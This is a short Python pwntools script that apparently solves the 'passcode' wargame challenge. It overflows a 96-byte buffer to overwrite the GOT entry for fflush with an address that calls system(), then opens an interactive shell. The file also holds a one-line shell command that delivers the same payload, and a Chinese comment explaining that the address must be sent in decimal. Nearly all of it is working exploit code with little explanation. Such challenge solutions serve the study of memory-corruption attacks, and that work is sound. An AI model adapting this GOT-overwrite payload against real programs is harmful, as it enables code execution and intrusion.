# coding:utf-8
from pwn import *
import struct 

conn = process('./passcode')
fllush_addr = 0x0804a004
system_addr = 0x080485e3
payload = 'a' * 96  + '\x04\xa0\x04\x08'
print(payload)
conn.send(payload)
# conn.send("0x080485e3") # 这种不行，因为0x不识别，必须是10进制
conn.send("134514147")
conn.interactive()

#writeup: python -c "print('a' * 96  + '\x04\xa0\x04\x08' + '134514147')" | ./passcode